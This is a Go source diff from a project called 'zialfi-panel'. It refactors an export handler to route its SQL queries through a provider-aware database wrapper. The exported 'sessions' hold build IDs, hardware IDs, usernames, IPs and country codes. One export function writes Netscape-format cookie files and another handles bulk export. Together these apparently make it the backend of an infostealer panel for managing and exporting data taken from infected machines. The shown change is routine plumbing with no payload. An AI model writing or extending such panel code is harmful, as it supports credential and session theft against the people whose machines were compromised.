@@ -8,14 +8,16 @@ import (
 	"net/http"
 
 	"github.com/go-chi/chi/v5"
+	"zialfi-panel/internal/db"
 )
 
 type ExportHandler struct {
 	db *sql.DB
+	provider     db.ProviderType
 }
 
-func NewExportHandler(db *sql.DB) *ExportHandler {
-	return &ExportHandler{db: db}
+func NewExportHandler(db *sql.DB, provider db.ProviderType) *ExportHandler {
+	return &ExportHandler{db: db, provider: provider}
 }
 
 func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
@@ -34,7 +36,7 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 
 	// Check session lock — hide sensitive data if locked by another
 	var lockedBy string
-	locked := h.db.QueryRow("SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
+	locked := db.QueryRow(h.db, h.provider, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
 	if locked && lockedBy != claims.UserID && claims.Role != "admin" {
 		writeError(w, http.StatusForbidden, "session is locked by another user")
 		return
@@ -57,7 +59,7 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 		CountryCode string
 		CreatedAt   string
 	}
-	err := h.db.QueryRow(`
+	err := db.QueryRow(h.db, h.provider, `
 		SELECT id, build_id, hwid, os, username, ip, country_code, created_at
 		FROM sessions WHERE id = ?`, id).Scan(
 		&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
@@ -114,14 +116,14 @@ func (h *ExportHandler) exportNetscape(w http.ResponseWriter, r *http.Request) {
 	}
 
 	var lockedBy string
-	locked := h.db.QueryRow("SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&lockedBy) == nil
+	locked := db.QueryRow(h.db, h.provider, "SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&lockedBy) == nil
 	if locked && lockedBy != claims.UserID && claims.Role != "admin" {
 		writeError(w, http.StatusForbidden, "session is locked by another user")
 		return
 	}
 
 	var exists bool
-	err := h.db.QueryRow("SELECT EXISTS(SELECT 1 FROM sessions WHERE id = ?)", sessionID).Scan(&exists)
+	err := db.QueryRow(h.db, h.provider, "SELECT EXISTS(SELECT 1 FROM sessions WHERE id = ?)", sessionID).Scan(&exists)
 	if err != nil || !exists {
 		writeError(w, http.StatusNotFound, "session not found")
 		return
@@ -191,7 +193,7 @@ func (h *ExportHandler) ExportBulk(w http.ResponseWriter, r *http.Request) {
 		}
 
 		var lockedBy string
-		locked := h.db.QueryRow("SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
+		locked := db.QueryRow(h.db, h.provider, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
 		if locked && lockedBy != claims.UserID && claims.Role != "admin" {
 			continue
 		}
@@ -208,7 +210,7 @@ func (h *ExportHandler) ExportBulk(w http.ResponseWriter, r *http.Request) {
 		var s struct {
 			ID, BuildID, Hwid, Os, Username, Ip, CountryCode, CreatedAt string
 		}
-		err := h.db.QueryRow(`
+		err := db.QueryRow(h.db, h.provider, `
 			SELECT id, build_id, hwid, os, username, ip, country_code, created_at
 			FROM sessions WHERE id = ?`, id).Scan(
 			&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
